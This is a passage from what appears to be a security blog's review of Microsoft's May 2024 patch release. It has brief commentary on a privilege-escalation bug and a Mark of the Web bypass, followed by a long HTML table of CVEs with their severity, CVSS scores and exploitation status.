href="https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks" target="_blank">here</a>. The delete happens when restarting the service. A low-privileged user can't restart the service directly. However, this could easily be combined with a bug that allows a low-privileged user to terminate any process by PID. After failure, the service will restart automatically, successfully triggering this vulnerability.</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30050" target="_blank"><strong>CVE-2024-30050</strong></a><strong> – Windows Mark of the Web Security Feature Bypass Vulnerability<br /></strong>We don’t normally detail Moderate-rated bugs, but this type of security feature bypass is quite in vogue with ransomware gangs right now. They zip their payload to bypass network and host-based defenses, they use a Mark of the Web (MotW) bypass to evade SmartScreen or Protected View in Microsoft Office. While we have no indication this bug is being actively used, we see the technique used often enough to call it out. Bugs like this one show why Moderate-rated bugs shouldn’t be ignored or deprioritized.</p><p class="">Here’s the full list of CVEs released by Microsoft for May 2024:</p>





















  
  
























<table border="0" cellpadding="0" cellspacing="0" width="953">
 <col width="151" />
 <col class="xl65" width="263" />
 <col class="xl66" span="4" width="111" />
 <col class="xl66" width="95" />
 <tr height="48">
  <td class="xl67" height="48" width="151"><span> </span>CVE<span> </span></td>
  <td class="xl68" width="263"><span> </span>Title<span> </span></td>
  <td class="xl69" width="111"><span> </span>Severity<span> </span></td>
  <td class="xl69" width="111"><span> </span>CVSS<span> </span></td>
  <td class="xl69" width="111"><span> </span>Public<span> </span></td>
  <td class="xl69" width="111"><span> </span>Exploited<span> </span></td>
  <td class="xl69" width="95">Type</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30051"><span><span> </span>CVE-2024-30051<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30040"><span><span> </span>CVE-2024-30040<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows MSHTML Platform Security Feature
  Bypass Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl69">SFB</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30046"><span><span> </span>CVE-2024-30046<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>ASP.NET Core Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.9</td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">DoS</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30044"><span><span> </span>CVE-2024-30044<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft SharePoint Server Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl74"><span> </span>Critical<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30045"><span><span> </span>CVE-2024-30045<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>.NET and Visual Studio Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.3</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30053"><span><span> </span>CVE-2024-30053 †</span></a></td>
  <td class="xl68" width="263"><span> </span>Azure Migrate Spoofing Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-32002"><span><span> </span>CVE-2024-32002 *</span></a></td>
  <td class="xl68" width="263"><span> </span>CVE-2023-32002 Recursive clones on
  case-insensitive filesystems that support symlinks are susceptible to Remote
  Code Execution<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">9.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30019"><span><span> </span>CVE-2024-30019<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>DHCP Server Service Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30047"><span><span> </span>CVE-2024-30047<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Dynamics 365 Customer Insights Spoofing
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.6</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30048"><span><span> </span>CVE-2024-30048<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Dynamics 365 Customer Insights Spoofing
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.6</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-32004"><span><span> </span>CVE-2024-32004 *</span></a></td>
  <td class="xl68" width="263"><span> </span>GitHub: CVE-2024-32004 GitHub:
  CVE-2023-32004 Remote Code Execution while cloning special-crafted local
  repositories<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30041"><span><span> </span>CVE-2024-30041<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Bing Search Spoofing
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.4</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30007"><span><span> </span>CVE-2024-30007<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Brokering File System Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30042"><span><span> </span>CVE-2024-30042<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Excel Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26238"><span><span> </span>CVE-2024-26238<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft PLUGScheduler Scheduled Task
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30054"><span><span> </span>CVE-2024-30054<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Power BI Client Javascript SDK
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="73">
  <td class="xl75" height="73"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30043"><span><span> </span>CVE-2024-30043<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft SharePoint Server Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30006"><span><span> </span>CVE-2024-30006<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft WDAC OLE DB provider for SQL
  Server Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29994"><span><span> </span>CVE-2024-29994<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Windows SCSI Class System File
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30027"><span><span> </span>CVE-2024-30027<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>NTFS Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30028"><span><span> </span>CVE-2024-30028<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30030"><span><span> </span>CVE-2024-30030<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30038"><span><span> </span>CVE-2024-30038<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30034"><span><span> </span>CVE-2024-30034<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Cloud Files Mini Filter Driver
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30031"><span><span> </span>CVE-2024-30031<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows CNG Key Isolation Service Elevation
  of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29996"><span><span> </span>CVE-2024-29996<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Common Log File System Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30025"><span><span> </span>CVE-2024-30025<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Common Log File System Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30037"><span><span> </span>CVE-2024-30037<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Common Log File System Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="77">
  <td class="xl75" height="77"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30016"><span><span> </span>CVE-2024-30016<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Cryptographic Services Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30020"><span><span> </span>CVE-2024-30020<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Cryptographic Services Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.1</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30036"><span><span> </span>CVE-2024-30036<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Deployment Services Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30032"><span><span> </span>CVE-2024-30032<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30035"><span><span> </span>CVE-2024-30035<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30008"><span><span> </span>CVE-2024-30008<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Information
  Disclosure<span>  </span>Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30011"><span><span> </span>CVE-2024-30011<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Hyper-V Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">DoS</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30010"><span><span> </span>CVE-2024-30010<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Hyper-V Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30017"><span><span> </span>CVE-2024-30017<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Hyper-V Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30018"><span><span> </span>CVE-2024-30018<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29997"><span><span> </span>CVE-2024-29997<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29998"><span><span> </span>CVE-2024-29998<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29999"><span><span> </span>CVE-2024-29999<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30000"><span><span> </span>CVE-2024-30000<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30001"><span><span> </span>CVE-2024-30001<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30002"><span><span> </span>CVE-2024-30002<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30003"><span><span> </span>CVE-2024-30003<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30004"><span><span> </span>CVE-2024-30004<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30005"><span><span> </span>CVE-2024-30005<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30012"><span><span> </span>CVE-2024-30012<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30021"><span><span> </span>CVE-2024-30021<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30039"><span><span> </span>CVE-2024-30039<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Remote Access Connection Manager
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30009"><span><span> </span>CVE-2024-30009<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30014"><span><span> </span>CVE-2024-30014<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30015"><span><span> </span>CVE-2024-30015<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30022"><span><span> </span>CVE-2024-30022<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
